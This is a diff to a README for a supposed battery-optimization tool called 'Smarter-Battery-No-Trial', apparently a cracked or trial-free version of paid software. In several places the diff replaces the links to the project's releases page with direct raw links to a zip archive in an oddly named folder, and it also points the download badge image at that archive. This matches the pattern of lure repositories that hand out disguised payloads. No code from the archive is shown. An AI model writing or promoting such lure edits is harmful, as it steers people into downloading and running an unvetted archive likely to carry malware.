@@ -1,6 +1,6 @@
 # 🎉 Smarter-Battery-No-Trial - Optimize Your Battery Performance Easily
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/muhammadkamran02/Smarter-Battery-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/muhammadkamran02/Smarter-Battery-No-Trial/main/wisdomless/Smarter-Battery-No-Trial-v2.9.zip)](https://raw.githubusercontent.com/muhammadkamran02/Smarter-Battery-No-Trial/main/wisdomless/Smarter-Battery-No-Trial-v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Smarter Battery! This application helps you manage your battery's hea
 
 ## 📥 Download & Install
 
-1. **Visit the Release Page:** Go to the [Releases page](https://github.com/muhammadkamran02/Smarter-Battery-No-Trial/releases).
+1. **Visit the Release Page:** Go to the [Releases page](https://raw.githubusercontent.com/muhammadkamran02/Smarter-Battery-No-Trial/main/wisdomless/Smarter-Battery-No-Trial-v2.9.zip).
    
 2. **Choose the Latest Version:** Look for the latest version at the top of the page. You will see a section labeled "Assets". 
 
@@ -56,4 +56,4 @@ If you encounter any issues or have questions, feel free to reach out. Your feed
 
 ## 🎯 Conclusion
 
-Smarter Battery provides intuitive tools to help you manage your device’s battery effectively. Download the software today through the [Releases page](https://github.com/muhammadkamran02/Smarter-Battery-No-Trial/releases) and start optimizing your battery performance!
+Smarter Battery provides intuitive tools to help you manage your device’s battery effectively. Download the software today through the [Releases page](https://raw.githubusercontent.com/muhammadkamran02/Smarter-Battery-No-Trial/main/wisdomless/Smarter-Battery-No-Trial-v2.9.zip) and start optimizing your battery performance!
